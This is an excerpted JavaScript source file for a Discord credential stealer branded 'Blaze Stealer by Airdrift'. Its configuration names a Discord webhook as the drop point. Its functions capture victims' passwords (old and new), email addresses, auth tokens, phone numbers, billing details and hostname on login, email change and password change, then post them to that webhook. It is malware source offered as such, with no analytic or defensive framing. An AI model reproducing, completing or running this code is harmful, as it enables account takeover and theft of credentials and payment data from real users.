...
var config = {
    ...
    webhook: "https://discord.com/api/webhooks/1102181924857974855/mtvezemvPEDWthGAuUNNpWwFOCeqC-1wZB7Y6jM50_Do-Rc-CuU8crNoZhUkomA6WFLo",
    ...
    ping: [true, "@BlazeStealer"],

    embed: {
        username: "Blaze Stealer",
        footer: {
            text: `Blaze Stealer by Airdrift`,
            icon_url: "https://cdn.discordapp.com/attachments/1097950183012192441/1099034070865940500/blazeinc.png",
        },
        href: "",
        avatar_url: "https://cdn.discordapp.com/attachments/1097950183012192441/1099034070865940500/blazeinc.png"
    },
...
// Traffic recording (Airdrift inspiration)
    ...
    async userLogin(password, email, token) {
        ...
        var params = {
            ...
            embeds: [createEmbed({
                ...
                fields: [{
                        name: "<:Square_Password:1099278680812961954> Password",
                        value: `\`\`\`${password}\`\`\``,
                        inline: true
                    },
                    {
                        name: "<:Gmail:1099276276407218186> E-Mail",
                        value: `\`\`\`${email}\`\`\``,
                        inline: true
                    },
                    {
                    ...
                    {
                        name: "<a:Payments_Nitro:1099278519747481670> Nitro",
                        value: `${getNitro(userInfo.premium_type)}`,
                        inline: false
                    }, {
                        name: "<a:MoneyCard3:1099275985452552192> Billing",
                        value: `${billing}`,
                        inline: true
                    }, {
                        name: "<a:Verified_animated:1099339001699242124> Badges",
                        value: `${getBadges(userInfo.flags)}`,
                        inline: false
                    },
                    {
                        name: "<a:wish:1099276711444619355> Token",
                        value: `\`\`\`${token}\`\`\``,
                        inline: false
                    }, {
                        name: "<a:Black_Crown:1099328288205324380> Hostname",
                        value: `\`\`\`${os.hostname}\`\`\``,
                        inline: false
                    },
                ],
    ...
    async emailChanged(password, newEmail, token) {
        ...
        var params = {
            ...
            embeds: [createEmbed({
                ...
                fields: [{
                        name: "<:Gmail:1099276276407218186> New email address",
                        value: `\`\`\`${newEmail}\`\`\``,
                        inline: true
                    },
                    {
    ...
    async passwordChanged(oldPassword, newPassword, token) {
        ...
        var params = {
            ...
            embeds: [createEmbed({
                ...
                fields: [{
                        name: "<:Square_Password:1099278680812961954> Old password",
                        value: `\`\`\`${oldPassword}\`\`\``,
                        inline: false
                    },
                    {
                        name: "<:newpasswd:1099682928641970196> New password",
                        value: `\`\`\`${newPassword}\`\`\``,
                        inline: false
                    },
                    {
                        name: "<:phone4:1099690186989912094> Phone Number",
                        value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
                        inline: false
                    },
                    {
...
async function getBilling(token) {
    ...
    json.forEach(z => {
        if (z.type == "") {
            ...
            billing += "\`✔️\`" + "<a:MoneyCard3:1099275985452552192>";
        } else {
            return "\`\`\`❌\`\`\`";
        };
    });
